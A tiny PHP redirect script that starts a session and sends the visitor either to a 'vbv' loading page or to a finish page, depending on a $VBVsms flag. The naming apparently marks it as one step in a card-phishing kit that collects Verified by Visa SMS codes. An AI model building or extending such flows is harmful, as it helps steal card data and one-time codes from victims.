<?php 
include '../../server/ab.php';

if (!isset($_SESSION)) {
    session_start();
}

if ($VBVsms){
    header('location: ./loading.php?rd=vbv');
}else{
    header('location: ./finish.php');
}



?>
